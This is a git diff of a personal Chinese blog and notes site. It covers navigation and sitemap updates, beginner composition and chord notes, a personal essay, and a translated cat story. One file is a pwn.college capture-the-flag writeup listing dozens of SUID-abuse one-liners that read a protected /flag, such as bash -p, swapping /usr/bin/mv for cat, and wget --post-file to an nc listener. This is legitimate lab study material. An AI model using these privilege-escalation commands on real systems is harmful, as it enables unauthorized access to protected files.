@@ -8,675 +8,749 @@
 
 ```diff
 
-@@ -4,6 +4,7 @@
- - [最近更新 | Last Updated](last-updated.md)
- - [问题总表 | Problems](问题总表.md)
- - [每日一文 | Daily Article](每日一文/每日一文.md)
-+  - [在什么地方活着 - 小川未明](每日一文/在什么地方活着%20-%20小川未明.md)
-   - [神迹下的健康心态 - 吴澧](每日一文/神迹下的健康心态%20-%20吴澧.md)
-   - [律师太太 - 希区柯克](每日一文/律师太太%20-%20希区柯克.md)
-   - [邻家的拖鞋 - 姬中宪](每日一文/邻家的拖鞋%20-%20姬中宪.md)
+@@ -162,8 +162,21 @@
+   - [摄影 | Photography](学习/摄影/摄影.md)
+     - [iPad 修图工作流](学习/摄影/iPad%20修图工作流.md)
+   - [音乐 | Music](学习/音乐/音乐.md)
+-    - [基础乐理](学习/音乐/基础乐理.md)
+-    - [常用三和弦](学习/音乐/常用三和弦.md)
++    - [作曲编曲入门 | Compose](学习/音乐/作曲编曲入门.md)
++      - [第一章：概述](学习/音乐/第一章：概述.md)
++      - [第一章第一节：音程旋律](学习/音乐/第一章第一节：音程旋律.md)
++      - [第一章第二节：旋律发展趋势](学习/音乐/第一章第二节：旋律发展趋势.md)
++      - [第一章第三节：和弦](学习/音乐/第一章第三节：和弦.md)
++      - [第一章第四节：功能和声](学习/音乐/第一章第四节：功能和声.md)
++      - [第一章第五节：流畅连接和弦](学习/音乐/第一章第五节：流畅连接和弦.md)
++      - [第一章第六节：旋律和声搭配](学习/音乐/第一章第六节：旋律和声搭配.md)
++      - [第一章第七节：终止](学习/音乐/第一章第七节：终止.md)
++      - [第一章第八节：曲式](学习/音乐/第一章第八节：曲式.md)
++      - [第一章第九节：乐句概述](学习/音乐/第一章第九节：乐句概述.md)
++      - [第一章第十节：乐句展示部](学习/音乐/第一章第十节：乐句展示部.md)
++    - [其他资料 | Others](学习/音乐/其他资料.md)
++      - [基础乐理](学习/音乐/基础乐理.md)
++      - [常用三和弦](学习/音乐/常用三和弦.md)
+   - [诗词格律 | Rules of Poem](学习/诗词格律/诗词格律.md)
+     - [诗韵](学习/诗词格律/诗韵.md)
+     - [平仄](学习/诗词格律/平仄.md)
+
+@@ -257,6 +270,7 @@
+     - [致南国微雪频道每一位订阅者的一封信](断章/赠与/致南国微雪频道每一位订阅者的一封信.md)
+     - [致两年后自己的一封信](断章/赠与/致两年后自己的一封信.md)
+   - [随记 | Essays](断章/随记/随记.md)
++    - [随记 - 2023 年 4 月 4 日](断章/随记/随记%20-%202023%20年%204%20月%204%20日.md)
+     - [随记 - 2023 年 1 月 18 日](断章/随记/随记%20-%202023%20年%201%20月%2018%20日.md)
+     - [随记 - 2022 年 12 月 23 日](断章/随记/随记%20-%202022%20年%2012%20月%2023%20日.md)
+     - [随记 - 2022 年 12 月 22 日](断章/随记/随记%20-%202022%20年%2012%20月%2022%20日.md)
 ```
 
 ## sitemap.txt
 
 ```diff
 
-@@ -68,6 +68,7 @@ https://tinysnow.github.io/每日一文/电影音乐给谁听 - 梁文道
- https://tinysnow.github.io/每日一文/白痴的故事 - 倪匡
- https://tinysnow.github.io/每日一文/目送 - 龙应台
- https://tinysnow.github.io/每日一文/看谁的文章写得好 - 李敖
-+https://tinysnow.github.io/每日一文/神迹下的健康心态 - 吴澧
- https://tinysnow.github.io/每日一文/第三大道的这间酒馆 - 约翰·麦克纳尔蒂
- https://tinysnow.github.io/每日一文/等我一年半 - 松本清张
- https://tinysnow.github.io/每日一文/经济学的旁听生 - 张晓风
-
-@@ -99,6 +100,8 @@ https://tinysnow.github.io/学习/公共基础知识/经济法
- https://tinysnow.github.io/学习/公共基础知识/行政法
- https://tinysnow.github.io/学习/公共基础知识/面试
- https://tinysnow.github.io/学习/公共基础知识/马克思主义哲学
-+https://tinysnow.github.io/学习/摄影/iPad 修图工作流
-+https://tinysnow.github.io/学习/摄影/摄影
- https://tinysnow.github.io/学习/日语/句型整理
- https://tinysnow.github.io/学习/日语/日语
- https://tinysnow.github.io/学习/日语/日语易错词
-
-@@ -122,6 +125,7 @@ https://tinysnow.github.io/学习/管理学/组织
- https://tinysnow.github.io/学习/管理学/规章制度
- https://tinysnow.github.io/学习/管理学/计划
- https://tinysnow.github.io/学习/管理学/领导
-+https://tinysnow.github.io/学习/花语/玫瑰
- https://tinysnow.github.io/学习/花语/花语
- https://tinysnow.github.io/学习/诗词格律/平仄
- https://tinysnow.github.io/学习/诗词格律/词牌名
+@@ -30,6 +30,7 @@ https://tinysnow.github.io/每日一文/刘正风灭门 - 金庸
+ https://tinysnow.github.io/每日一文/双鱼 - 三毛
+ https://tinysnow.github.io/每日一文/吃饭是一件需要认真对待的事 - 梁文道
+ https://tinysnow.github.io/每日一文/向自己说再见 - 希区柯克
++https://tinysnow.github.io/每日一文/在什么地方活着 - 小川未明
+ https://tinysnow.github.io/每日一文/夜空中的木拐 - 从维熙
+ https://tinysnow.github.io/每日一文/大坝垮的那天 - 詹姆斯 · 瑟伯
+ https://tinysnow.github.io/每日一文/大胡子与我 - 三毛
 ```
 
 
-## pwn.college-writeup.md
+## 作曲编曲入门.md
 
 ```diff
 
-@@ -1,6 +1,6 @@
- # pwn.college writeup
- 
--## Prenote
-+## Premise
- 
- - Personal solutions, that is saying maybe not the best.
- - The sequence number of each section is the challenge number. **CORRESPONDING.**
-
-@@ -12,7 +12,164 @@
- - When first enter a new challenge, maybe need to execute the level program purely to get the specifically random value before coding any solutions.
- - The order number is the corresponding challenge number, however, in some certain semester, both are not same, readers should looking for the order number which locates in head of each line under solutions section.
- 
--## Archive F2021
-+## Fundamentals
+@@ -0,0 +1,7 @@
++# 作曲编曲入门
 +
-+### Program Misuse
++- 强烈推荐　**<u>程嘉溪</u>**　的作曲编曲教程
 +
-+#### Solutions
++- [BiliBili 个人空间](https://space.bilibili.com/364738464/channel/series)
++- [Youtube Channel](https://www.youtube.com/@ChengJiaXi/playlists)
 +
-+1. `cat /flag`
-+
-+2. `more /flag`
-+
-+3. `less /flag`
-+
-+4. `tail /flag`
-+
-+5. `head /flag`
-+
-+6. `sort /flag`
-+
-+7. `vim /flag`
-+
-+8. `emacs /flag`
-+
-+9. `nano /flag`
-+
-+10. `rev /flag | rev`
-+
-+11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
-+    - `man od` or `od --help` can peek the usage of `od`
-+      - `-c` same as `-t c`,  select printable characters or backslash escapes
-+      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
-+    - `awk` is a column based data filter
-+      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
-+      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
-+      - `'{$1="";print $0}'` is the command
-+        - First, let the first column be `null`
-+        - Second, print all the columns
-+    - `sed` is a stream editor
-+      - `-E`, use extended regular expressions
-+      - `-e`, execute multiple `sed` commands
-+      - `'s/[0-9]{7}//;s/ //g'`
-+        - `s/[0-9]{7}//` delete the offset address displayed number
-+        - `s/ //g` delete all the whitespaces
-+    
-+12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
-+    - `awk` part
-+      - use the last column
-+    - `tr`, translate, squeeze, and/or delete characters
-+      - remove all the `Enter(\n)`
-+    - `sed` part
-+      - delete all the `|` characters
-+      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
-+    
-+13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
-+
-+14. `base32 /flag | base32 -d`
-+
-+15. `base64 /flag | base64 -d`
-+
-+16. `split /flag | cat ./xaa`
-+
-+17. `gzip -c /flag | zcat`
-+
-+18. `bzip2 -c /flag | bzcat`
-+
-+19. `zip - /flag | zcat`
-+
-+20. `tar -cvf - /flag | cat`
-+
-+21. ```bash
-+    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
-+    # then remove files
-+    rm -rf tmp.a flag
-+    ```
-+
-+22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
-+
-+23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
-+    
-+- `genisoimage --help 2>&1 | grep FILE`
-+    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
-+    
-+24. `env -i cat /flag`
-+
-+25. `find / -maxdepth 1 -name flag -exec cat {} \;`
-+
-+26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
-+
-+27. `nice cat /flag`
-+
-+28. `timeout 1000 cat /flag`
-+
-+29. `stdbuf -o L cat /flag`
-+
-+30. `setarch x86_64 -v cat /flag`
-+
-+31. `watch -x cat /flag`
-+
-+32. `socat - /flag`
-+
-+33. `whiptail --textbox /flag 20 60`
-+
-+34. `awk '{print $0}' /flag`
-+
-+35. `sed -n 'p' /flag`
-+
-+36. ```bash
-+    ed /flag
-+    .
-+    q
-+    ```
-+
-+37. `chown -v hacker /flag && cat /flag`
-+
-+38. `chmod 444 /flag && cat /flag`
-+
-+39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
-+
-+40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
-+
-+    - This level's solution is pretty tricky
-+    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
-+    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
-+    - Finally, 'cat' it, but our command should be `mv /flag`
-+
-+41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
-+
-+42. `python -c 'print(open("/flag").read())'`
-+
-+43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
-+
-+44. ```bash
-+    bash -p
-+    cat /flag
-+    ```
-+    
-+    - **HARD**
-+    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
-+
-+45. `date -f /flag`
-+
-+46. `dmesg -F /flag`
-+
-+47. `wc --files0-from=/flag`
-+
-+48. **HARD** `gcc -x assembler /flag`
-+
-+49. `as @/flag`
-+
-+50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
-+
-+    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
-+
-+51. TODO
-+
-+#### Confusing Question Numbers
-+
-+- 17
-+- **20** ( really confused )
- 
- ### Program Interaction
- 
-
-@@ -340,178 +497,19 @@
- 
- 48. 
- 
--
--
- #### Confusing Question Numbers
- 
- - 7
- - 15
- - 21
- 
--
--
- #### TODO
- 
- - Use `sed` to replace all the interaction steps ( `vim` etc. ).
- 
-+### Assembly Crash Course
- 
--
--### Program Misuse
--
--#### Solutions
--
--1. `cat /flag`
--
--2. `more /flag`
--
--3. `less /flag`
--
--4. `tail /flag`
--
--5. `head /flag`
--
--6. `sort /flag`
--
--7. `vim /flag`
--
--8. `emacs /flag`
--
--9. `nano /flag`
--
--10. `rev /flag | rev`
--
--11. `od -c -w1024 /flag | awk -F" " -v OFS='' '{$1="";print $0}'` or `od -c -w1024 /flag | sed -Ee 's/[0-9]{7}//;s/ //g'`
--    - `man od` or `od --help` can peek the usage of `od`
--      - `-c` same as `-t c`,  select printable characters or backslash escapes
--      - `-w[BYTES]`, `--width[=BYTES]`, output BYTES bytes per output line; 32 is implied when BYTES is not specified
--    - `awk` is a column based data filter
--      - `-F`, `--field-separator fs`, set the `FS` variable to `fs`, using `fs` to split input content, so here is `space`
--      - `-v var=val`, `--assign var=val`, set the variable `var` to the value `val` *before* execution of the program begins. `OFS` is output-field-separator, so here using `null` to reformat the output
--      - `'{$1="";print $0}'` is the command
--        - First, let the first column be `null`
--        - Second, print all the columns
--    - `sed` is a stream editor
--      - `-E`, use extended regular expressions
--      - `-e`, execute multiple `sed` commands
--      - `'s/[0-9]{7}//;s/ //g'`
--        - `s/[0-9]{7}//` delete the offset address displayed number
--        - `s/ //g` delete all the whitespaces
--    
--12. `hd /flag | awk '{print $(NF)}' | tr -d '\n' | sed -Ee 's/\|//g;s/\.[0-9]{8}/\n/'`
--    - `awk` part
--      - use the last column
--    - `tr`, translate, squeeze, and/or delete characters
--      - remove all the `Enter(\n)`
--    - `sed` part
--      - delete all the `|` characters
--      - transform all `.XXXXXXXX` pattern (`X` is one number) into a `Enter(\n)`
--    
--13. `xxd /flag | awk '{print $(NF)}' | tr -d '\n' | sed 's/\.$/\n/'`
--
--14. `base32 /flag | base32 -d`
--
--15. `base64 /flag | base64 -d`
--
--16. `split /flag | cat ./xaa`
--
--17. `gzip -c /flag | zcat`
--
--18. `bzip2 -c /flag | bzcat`
--
--19. `zip - /flag | zcat`
--
--20. `tar -cvf - /flag | cat`
--
--21. ```bash
--    ar -rvs ~/tmp.a /flag; ar -x ~/tmp.a flag; cat flag
--    # then remove files
--    rm -rf tmp.a flag
--    ```
--
--22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
--
--23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
--    
--- `genisoimage --help 2>&1 | grep FILE`
--    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
--    
--24. `env -i cat /flag`
--
--25. `find / -maxdepth 1 -name flag -exec cat {} \;`
--
--26. `echo -e "ans: /flag\n\tcat /flag" > Makefile && make`
--
--27. `nice cat /flag`
--
--28. `timeout 1000 cat /flag`
--
--29. `stdbuf -o L cat /flag`
--
--30. `setarch x86_64 -v cat /flag`
--
--31. `watch -x cat /flag`
--
--32. `socat - /flag`
--
--33. `whiptail --textbox /flag 20 60`
--
--34. `awk '{print $0}' /flag`
--
--35. `sed -n 'p' /flag`
--
--36. ```bash
--    ed /flag
--    .
--    q
--    ```
--
--37. `chown -v hacker /flag && cat /flag`
--
--38. `chmod 444 /flag && cat /flag`
--
--39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
--
--40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
--
--    - This level's solution is pretty tricky
--    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
--    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
--    - Finally, 'cat' it, but our command should be `mv /flag`
--
--41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
--
--42. `python -c 'print(open("/flag").read())'`
--
--43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
--
--44. ```bash
--    bash -p
--    cat /flag
--    ```
--    
--    - **HARD**
--    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
--
--45. `date -f /flag`
--
--46. `dmesg -F /flag`
--
--47. `wc --files0-from=/flag`
--
--48. **HARD** `gcc -x assembler /flag`
--
--49. `as @/flag`
--
--50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
--
--    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
--
--51. TODO
--
--#### Confusing Question Numbers
--
--- 17
--- **20** ( really confused )
-+`TODO`
- 
- ### Debugging Refresher
- 
-
-@@ -654,27 +652,11 @@
-      - In general, `set disassembly-flavor intel` can be in there.
-    - `silent` indicates that we want gdb to not report that we have hit a breakpoint, to make the output a bit cleaner.
- 
--## Computer Systems Security (ASU CSE 466)
--
--### Program Misuse
--
--Same as `Archive F2021 - Program Misuse`.
--
--### Program Interaction
--
--Same as `Archive F2021 - Program Interaction`.
--
--### Debugging Refresher
--
--Same as `Archive F2021 - Debugging Refresher`.
--
--8. TODO
--
--## Introduction to Cybersecurity (ASU CSE 365)
-+## Intro to Cybersecurity
- 
- ### Talking Web
- 
--#### Prenote
-+#### Premise
- 
- In each level, before taking any operation, we must let the server run. However, after we run it, the current terminal can NOT type other commands. So we need a terminal multiplexer in order to input final command that can get the `flag` of each level.
- 
-
-@@ -692,3 +674,66 @@ tmux new -s work
- 1. `curl 127.0.0.1`
- 2. 
- 
-+### Building a Web Server
-+
-+### Intercepting Communication
-+
-+### Cryptography
-+
-+### Web Security
-+
-+## Program Security
-+
-+### Shellcode Injection
-+
-+### Reverse Engineering
-+
-+### Memory Errors
-+
-+### Program Exploitation
-+
-+## System Security
-+
-+### Introduction
-+
-+**No challenges in this module.**
-+
-+### Sandboxing
-+
-+### Race Conditions
-+
-+### Kernel Security
-+
-+### System Exploitation
-+
-+## Software Exploitation
-+
-+### Return Oriented Programming
-+
-+### Format String Exploits
-+
-+### File Struct Exploits
-+
-+### Dynamic Allocator Misuse
-+
-+### Exploitation Primitives and Memory Mastery
-+
-+### Dynamic Allocator Exploitation
-+
-+## Archived Modules
-+
-+### Memory Errors
-+
-+### Advanced Exploitation
-+
-+## Example Dojo
-+
-+### Hello
-+
-+### World
-+
-+## Example Import Dojo
-+
-+### Hello
-+
-+### Planet
-\ No newline at end of file
 ```
 
-## 第四章：负数与减法.md
+## 其他资料.md
+
+```diff
+
+@@ -0,0 +1,4 @@
++## 其他资料
++
++一些零碎的、杂七杂八的资料。
++
+```
+
+## 基础乐理.md
 
 ```diff
 
 @@ -1,4 +1,4 @@
--# 第四章：负数与减法
-+# 第四章：负数与减法（WIP）
+-# 基础乐理
++# 基础乐理（WIP/Deprecated）
  
- ## 复习
+ ## 简谱
  
-```
 
-## 随记 - 2023 年 4 月 4 日.md
+@@ -9,20 +9,15 @@
+ 
+ ## 音程关系
+ 
+-### 全音
++### 自然大调
+ 
+-- 1 -> 2
+-- 2 -> 3
+-- ####
+-- 4 -> 5
+-- 5 -> 6
+-- 6 -> 7
+-- ####
++- 1　2　3　4　5　6　7　1
++-   全  全   **半**  全  全  全  **半**
+ 
+-### 半音
++### 自然小调
+ 
+-- 3 -> 4
+-- 7 -> 高音 1
++- 1　2　3　4　5　6　7　1
++-   全   **半**  全  全  **半**  全  全
+ 
+ ## 和弦
+ 
 
-```diff
-
-@@ -0,0 +1,69 @@
-+# 随记 - 2023 年 4 月 4 日
-+
-+## 封面图
-+
-+![](https://raw.githubusercontent.com/TinySnow/GithubImageHosting/main/blog/articles/essays/yang-yu-1LQYUE-ZwIo-unsplash.jpg)
-+
-+> 摄影师 | Yang Yu
-+>
-+> 图源 | Unsplash
-+
-+## 写在前面
-+
-+<p style="color:red; text-align:center; font-weight:bold; font-size:larger;">1058 字 | 感触 | 过往</p>
-+
-+## 正文
-+
-+　　前些天晚上。
-+
-+　　我们依旧老地方练舞，但这次好像多了些人。并非我们的人，而是动漫社的人。应该是排练什么节目，最后一次合拍彩排。
-+
-+　　<u>清一色的女孩子，穿得漂漂亮亮。大部分洛丽塔，小部分汉服，零星几个 JK。服装齐全。</u> 看不清相貌如何，据最近的看，似乎化了妆。
-+
-+　　场面蔚为大观。
-+
-+　　我看不清那些人， <u>但不用看也知道，现在场上的这群女孩子，很容易勾人恻隐之心。</u>
-+
-+　　这恻隐之心，无关性别。而今天的话题，也无关男女。
-+
-+　　早些年，我也是浪迹于动漫之中的二次元爱好者。标志性特征，就是羡慕那 16:9 荧屏中的美好，觉得现实丑恶不堪，泥泞又肮脏。
-+
-+　　彼时我羡艳里面的友情、爱情、救赎和勇气等等，同时无比渴望——有一个人来拯救我于这水深火热之中。 <u>而且那人，最好是异性，容貌姣好，亭亭玉立且落落大方。</u>
-+
-+　　不要笑。我觉得这可能是很多人刚进入动漫世界里的常态。
-+
-+　　那时候，我是他们一群人中的一员——站在那群打扮艳丽的女孩子旁，远远地观望着她们的那群人。
-+
-+　　更遥远的时候，我也曾面目狰狞地憎恶过为什么我不是她们，只是看上去便让人心情愉悦。但此处无关主题，封笔不谈。
-+
-+　　我现在认为，那时候的我，受动漫拯救，也为它所荼毒。
-+
-+　　**可能荼毒多一点。**
-+
-+　　不知何时起，年少的我意识到，这样绝无可能等到梦中之人。或有意或无意，渐渐地疏远了这个领域。而最重要的一个变化，便是开始了舞蹈。这大概是影响一生的决定，却润物无声。
-+
-+　　年少的我，曾观望着形容绮丽的她们，无比钦慕；也观望着挥汗如雨，练习舞蹈的他们，理解不能。那时是真真正正地不能感悟到——他们，究竟是为了什么，累，并且不能讨好更多的人。 **那时我想，我大概绝不会成为这样的人。**
-+
-+　　而如今的我，正观望着同样姣容月貌的她们，只有欣赏；却坚定无比地，站在汗如雨下、累而不讨好的这一边。
-+
-+　　似乎一再成为了当初自己无法想象的样子。
-+
-+　　这便是这篇文章的来源。
-+
-+　　**<u>当我意识到这个想法的时候，我似乎隔着接近十年差距的时光隧道，远远地和那个年少的自己，对上了一眼。</u>**
-+
-+　　街舞和宅舞，没有高下之分，优劣各持。我只是感慨：我似乎，终究选择了走上现实这一条路。也品尝到了，它所带给我的累累硕果。
-+
-+　　而至于另一个平行世界线，一直坚守着梦中之人的那个我，有没有得到梦寐以求的结果，我不知道。或许吧，但这也无关紧要了。
-+
-+　　有可能的话，我只是想对这个世界线上、时光隧道那头的自己说一句：等是等不到的，早日拥抱现实，可能你会更开心一点。
-+
-+　　如今我依旧看那些美好，但也只能勉为其难称为伪宅；也依旧和他们在一起——去玩、去图书馆、去约饭、去表演。
-+
-+　　<u>我想我现在，更喜欢后面的生活。</u>
-+
-+<br />
-+
-+　　南国微雪 Miyuki
-+
-+　　2023 年 4 月 4 日
+@@ -34,7 +29,3 @@
+ - 减三和弦：小三度 + 小三度
+ 
+ ### 七和弦
+-
+-## 调式
+-
+-## 未完成
 \ No newline at end of file
 ```
 
-## 在什么地方活着 - 小川未明.md
+## 常用三和弦.md
 
 ```diff
 
-@@ -0,0 +1,69 @@
-+# 在什么地方活着
+@@ -8,7 +8,7 @@
+ |        |     3      |       4        |      5       |      6       |     7      |      1       |     2      |
+ |        |     1      |       2        |      3       |      4       |     5      |      6       |     7      |
+ | 和弦名 |   **C**    |     **Dm**     |    **Em**    |    **F**     |   **G**    |    **Am**    |   **B_**   |
+-| 级数名 |     I      |       II       |     III      |      IV      |     V      |      VI      |    VII     |
++| 级数名 |     I      |       ii       |     iii      |      IV      |     V      |      vi      |    vii°    |
+ | 功能名 | **主和弦** | **副下属和弦** | **副属和弦** | **下属和弦** | **属和弦** | **副主和弦** | **导和弦** |
+ 
+ ## 主和弦类
+
+@@ -19,7 +19,7 @@
+ |        |     3      |      1       |
+ |        |     1      |      6       |
+ | 和弦名 |   **C**    |    **Am**    |
+-| 级数名 |     I      |      VI      |
++| 级数名 |     I      |      vi      |
+ | 功能名 | **主和弦** | **副主和弦** |
+ 
+ ## 属和弦类
+
+@@ -30,7 +30,7 @@
+ |        |     7      |      5       |
+ |        |     5      |      3       |
+ | 和弦名 |   **G**    |    **Em**    |
+-| 级数名 |     V      |     III      |
++| 级数名 |     V      |     iii      |
+ | 功能名 | **属和弦** | **副属和弦** |
+ 
+ ## 下属和弦类
+
+@@ -41,7 +41,7 @@
+ |        |      6       |       4        |
+ |        |      4       |       2        |
+ | 和弦名 |    **F**     |     **Dm**     |
+-| 级数名 |      IV      |       II       |
++| 级数名 |      IV      |       ii       |
+ | 功能名 | **下属和弦** | **副下属和弦** |
+ 
+ ## 导和弦类
+
+@@ -52,6 +52,6 @@
+ |        |     2      |
+ |        |     7      |
+ | 和弦名 |   **B_**   |
+-| 级数名 |    VII     |
++| 级数名 |    vii°    |
+ | 功能名 | **导和弦** |
+ 
+```
+
+## 第一章第一节：音程旋律.md
+
+```diff
+
+@@ -0,0 +1,63 @@
++# 第一章第一节：音程旋律
 +
-+*小川未明*
++## 音程
 +
-+　　小猫虽然不知道他出生前母猫的生活，但是从他记事时起，他们就无家可归，被追赶，一直被人欺负。母猫把小猫生在了一家破旧的库房的角落。在那里住了几天之后，小猫的眼睛终于睁开了。母亲一回来晚了，就会从空箱子里面探出头来，朝着明亮的方向不住地哭叫。母猫一听见他的哭叫声，就会匆匆忙忙地跑回来。然后，迅速跳进箱子里，赶紧给孩子喂奶。
++| 简谱 |  1   |  2   |  3   |  4   |  5   |  6   |  7   |
++| :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
++| 唱名 |  do  |  re  |  mi  |  fa  | sol  |  la  |  si  |
++| 音名 |  C   |  D   |  E   |  F   |  G   |  A   |  B   |
 +
-+　　但是，这里也不是一个安全的住地。有一天，库房的主人突然发现了他们，大发雷霆：“什么时候跑到这里来做窝了？快给我滚出去！”说着，就操起扫帚，把他们轰了出去，可怜的母猫只好赶紧叼起小猫，逃了出来。他们穿过空地，向林子那边跑去。
++- C - C：一度
++- C - D：二度
++- C - E：三度
++- C - F：四度
++- C - G：五度
++- C - A：六度
++- C - B：七度
++- **注意：不准确，但目前足够**
 +
-+　　那里有一座小祠堂，她想，祠堂的廊下也许会安全些吧！可是，那里充满了湿气，到处都挂满了蜘蛛网。当她发现那里还是野狗的藏身之地时，就毫不犹豫地离开了。母猫没有办法，只好又叼着孩子，返回到镇子里来了。
++## 方法
 +
-+　　秋天就快结束了，镇子里格外寂静。那天，没有风，蓝天上的太阳温暖地照射着各家各户的屋顶。母猫发现了一扇开着窗户、晒着被子的两层楼的人家，就大胆地攀过了围墙。因为她想，现在无论多么冒险，为了小猫，都必须要找一个好地方。幸好没有人在家，她马上把小猫带到了屋里。她放开身子躺下，给小猫喂奶。如果能这样一直持续下去的话，猫母子俩该有多幸福啊！如果是换了一般的人饲养的猫，这种奢侈根本算不了什么，可是对于这两只猫来说，却是非分之求。然而，就是这种片刻的安宁，也付出了可怕的代价，很快就遭到了厄运。女主人顺着梯子爬上来，大吵大闹，跑去拿棍子要打他们。女主人想，要是给无家可归的猫住进来，那可不得了。她大概是为了防止这种事情再次发生，要好好地教训他们一顿吧！但是，等她回来的时候，两只猫已经不见了。
++1. 确定调式调性
++   - C 大调
++2. 挑一个音高
++   - C6
++3. 接着随机写作
++   - 音长随机
++   - 音高进行方向
++   - 同音重复
++   - **级进进行** （二度）
++   - **小跳进行** （三度）
++   - **大跳进行** （多于三度）
++   - 六度以上跳进
++     - 必须反向进行音高
++4. 修改和调整
++   - 音高
++   - 音长
++     - 拉长
++     - 缩短
++     - 拆分
++     - 合并
++     - 交换
++     - 删除
++5. 直到满意
 +
-+　　每家每户的屋顶都紧紧地挨着，好像滚滚的波涛。对于不能住在地面上的猫母子来说，这里恐怕是唯一的安身之地了。两只猫已经不想再下去了。要是不刮让人瑟瑟发抖的寒风，那就更好了。
++## 参考规范
 +
-+　　“你哪儿也不准去，知道吗？呆在这儿别动，等着妈妈回来。”
++- 音域 12 度以内
++  - 不好演奏
++  - 不好演唱
++  - 缺少连贯性
++- 级进跳进交错
++  - 保持活力
++  - 保持稳定
 +
-+　　母猫这样告诫小猫。夹在高房子中间，这座不起眼的平房相对比较避风，但也有的日子，被太阳一晒，马口铁的屋顶会升腾起一阵阵热浪。要是小猫一个人不乱走，这里倒是一个比任何地方都好的地方。不过，因为小猫已经知道每次被人追赶、被人欺负，都是母猫拼命保护着自己，所以小猫从来不会违背母亲的叮嘱。
++## 优缺点
 +
-+　　母猫一边惦记着留在屋顶的小猫，一边到各处的垃圾箱和人家的后门去寻找食物，那可不是一般的辛苦。不管多么着急，都要找到吃的，不能空手回去。
++- 无需灵感，无需创意
++- 旋律多样，不会重复
++- 需要调整，否则难听
 +
-+　　一听到爪子翻墙时发出的尖厉的响声，小猫便知道是母猫回来了，于是，就叫唤着从屋檐下探出头来。
++## 注意
 +
-+　　这时，被夕阳一照，母猫那消瘦的身子在屋顶上拖出一条长长的灰影。她毛色灰暗，肚子两边瘦得不成样子。她看到孩子平安无事，便高兴地把带回来的食物给他吃。而自己却好像忘记了饥饿，眯缝着眼睛，心满意足地看着孩子在吃东西。
-+
-+　　冬天的夜晚，北风寒冷刺骨，毫不留情地在屋顶上吹过。母猫把孩子推到墙角，用自己的身体挡住风，用自己的体温给他取暖。因为这样，小猫才得以安稳地入睡。这一幕，在小猫的一生中，不知留下了多么深刻的烙印！
-+
-+　　早晨，太阳一出来，母猫便出门了。屋顶上的霜像白雪一样，白晃晃的，十分刺眼。小猫不禁打了一个寒战。
-+
-+　　刚走出去的母猫回过头来，看着他说：“今天会是一个好天！我回来再跟你玩。”
-+
-+　　不知是什么样的人住在这屋顶下面，但是一早一晚都会听见年轻、朝气蓬勃的说笑声，白天却非常安静。从这点看，年轻人白天似乎到什么地方去上班了，老人留在家里看家。大概只剩一位老人了吧，常常可以听到嘶哑的咳嗽声和水池传来的流水声。没有别的淘气的孩子，实在是万幸。
-+
-+　　旁边有一棵高大的树，它的落叶被风吹着，在导水管和屋檐的边上积了起来。那些落叶时不时地会像龙卷风一样漫天飞舞，两只猫一边在屋檐的角落里避风，一边看着。
-+
